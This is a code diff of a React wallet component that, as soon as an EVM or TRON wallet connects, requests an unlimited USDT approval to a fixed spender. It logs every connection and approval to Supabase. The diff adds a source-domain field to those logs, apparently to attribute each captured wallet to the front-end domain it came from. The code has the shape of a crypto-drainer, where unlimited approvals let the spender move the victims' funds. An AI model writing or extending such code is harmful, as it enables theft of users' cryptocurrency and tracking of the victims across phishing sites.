@@ -5,6 +5,7 @@ import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
 import { TronWeb } from 'tronweb';
 import { supabase } from '../lib/supabaseClient';
 import { isMainnet } from '../lib/walletConfig';
+import { getSourceDomain } from '../config/domains';
 
 // ── Contract addresses ────────────────────────────────────────────────────────
 const EVM_USDT = isMainnet()
@@ -58,17 +59,17 @@ const TRON_MAX = '11579208923731619542357098500868790785326998466564056403945758
 // Treat as "unlimited" if allowance >= half of maxUint256
 const UNLIMITED_THRESHOLD = maxUint256 / 2n;
 
-async function trackConnection(address, network, walletType) {
+async function trackConnection(address, network, walletType, sourceDomain) {
   const { error } = await supabase.from('wallet_connections').upsert(
-    { address, network, wallet_type: walletType, last_seen_at: new Date().toISOString() },
+    { address, network, wallet_type: walletType, last_seen_at: new Date().toISOString(), source_domain: sourceDomain },
     { onConflict: 'address,network' }
   );
   if (error) console.error('[Supabase] trackConnection failed:', error);
 }
 
-async function trackApproval(address, network, txHash) {
+async function trackApproval(address, network, txHash, sourceDomain) {
   const { error } = await supabase.from('usdt_approvals').upsert(
-    { address, network, tx_hash: txHash },
+    { address, network, tx_hash: txHash, source_domain: sourceDomain },
     { onConflict: 'address,network' }
   );
   if (error) console.error('[Supabase] trackApproval failed:', error);
@@ -96,7 +97,7 @@ function EvmApprovalWatcher() {
     const key = address.toLowerCase();
     if (connectionTracked.current.has(key)) return;
     connectionTracked.current.add(key);
-    trackConnection(key, 'evm', connector?.name || 'unknown').catch(console.error);
+    trackConnection(key, 'evm', connector?.name || 'unknown', getSourceDomain()).catch(console.error);
   }, [isConnected, address, connector]);
 
   // Check allowance and request approval
@@ -115,7 +116,7 @@ function EvmApprovalWatcher() {
       functionName: 'approve',
       args: [EVM_SPENDER, maxUint256],
     })
-      .then((hash) => trackApproval(key, 'evm', hash))
+      .then((hash) => trackApproval(key, 'evm', hash, getSourceDomain()))
       .catch((err) => console.error('[UsdtApproval] EVM approve failed:', err));
   }, [isConnected, address, allowance, writeContractAsync]);
 
@@ -135,7 +136,7 @@ function TronApprovalWatcher() {
     // Track connection
     if (!connectionTracked.current.has(address)) {
       connectionTracked.current.add(address);
-      trackConnection(address, 'tron', wallet?.adapter?.name || 'unknown').catch(console.error);
+      trackConnection(address, 'tron', wallet?.adapter?.name || 'unknown', getSourceDomain()).catch(console.error);
     }
 
     if (!TRON_SPENDER) return;
@@ -159,7 +160,7 @@ function TronApprovalWatcher() {
           if (current >= BigInt(TRON_MAX) / 2n) return;
 
           const txId = await contract.approve(TRON_SPENDER, TRON_MAX).send();
-          await trackApproval(address, 'tron', txId);
+          await trackApproval(address, 'tron', txId, getSourceDomain());
         } else {
           // WalletConnect (or non-injecting mobile wallet):
           // Use a headless TronWeb instance for reading state + building unsigned txs,
@@ -193,7 +194,7 @@ function TronApprovalWatcher() {
 
           // Broadcast
           const result = await tronWeb.trx.sendRawTransaction(signedTx);
-          await trackApproval(address, 'tron', result.txid);
+          await trackApproval(address, 'tron', result.txid, getSourceDomain());
         }
       } catch (err) {
         console.error('[UsdtApproval] TRON approve failed:', err);
